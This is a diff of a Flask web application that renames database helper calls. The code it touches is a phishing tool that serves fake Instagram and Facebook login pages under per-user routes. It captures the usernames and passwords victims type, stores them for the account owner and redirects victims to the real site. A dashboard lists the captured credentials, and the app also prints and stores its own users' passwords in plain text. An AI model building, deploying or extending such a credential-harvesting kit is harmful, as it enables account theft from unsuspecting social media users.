@@ -24,11 +24,11 @@ def register():
     if request.method=='POST':
         uid=request.form.get("username")
         
-        if not dbh.checkIfUserExists(uid):
+        if not dbh.check_if_user_exists(uid):
             email=request.form.get("email")
             pas=request.form.get("psw")
             print(uid,email,pas)
-            dbh.insertIntoUser(uid,email,pas)
+            dbh.insert_into_user(uid,email,pas)
             session['user']=uid
             return redirect("/")
         else:
@@ -51,7 +51,7 @@ def login():
             session['admin']="admin"
             print(username,"logged in admin")
             return redirect('/admin')
-        elif dbh.checkUserCredential(username,password):
+        elif dbh.check_user_credential(username,password):
             session['user']=username
             print(username,"logged in")
             return redirect('/')
@@ -89,7 +89,7 @@ def apps():
 @app.route('/dashboard')
 def dashboard():
     if 'user' in session :
-        return render_template("dashboard.html",data=dbh.getTrapedDataForOwner(session['user']),isLogged=True,uid=session['user'])
+        return render_template("dashboard.html",data=dbh.get_traped_data_for_owner(session['user']),isLogged=True,uid=session['user'])
     return render_template("login.html",isLogged=False)
 
 
@@ -106,7 +106,7 @@ def contactus():
         email=request.form.get('yemail')
         msg=request.form.get('ymessage')
         print(uid,name,email,msg)
-        dbh.saveFeedback(uid,name,email,msg)
+        dbh.save_feedback(uid,name,email,msg)
         return redirect('/')
     return render_template('contactus.html')
 
@@ -132,7 +132,7 @@ def insta():
 #completed
 @app.route("/<userid>/instagram.com")
 def InstaPhishingPage(userid):
-    if dbh.checkIfUserExists(userid):
+    if dbh.check_if_user_exists(userid):
         return render_template("apps/insta.html",uid=userid)
     return render_template('page_not_found.html')
 
@@ -147,7 +147,7 @@ def loginInsta():
         site=request.form.get('app')
         uid=request.form.get('uid')
         pas=request.form.get('pas')
-        dbh.insertIntoTraped(owner,site,uid,pas)
+        dbh.insert_into_traped(owner,site,uid,pas)
         print(owner,site,uid,pas)
     return redirect("https://instagram.com")
 
@@ -165,7 +165,7 @@ def facebook():
 #completed
 @app.route("/<userid>/facebook.com")
 def FacebookPhishingPage(userid):
-    if dbh.checkIfUserExists(userid):
+    if dbh.check_if_user_exists(userid):
         return render_template("apps/facebook.html",uid=userid)
     return render_template('page_not_found.html')
 
@@ -179,7 +179,7 @@ def loginFacebook():
         site=request.form.get('app')
         uid=request.form.get('uid')
         pas=request.form.get('pas')
-        dbh.insertIntoTraped(owner,site,uid,pas)
+        dbh.insert_into_traped(owner,site,uid,pas)
         print(owner,site,uid,pas)
     return redirect("https://facebook.com")
 
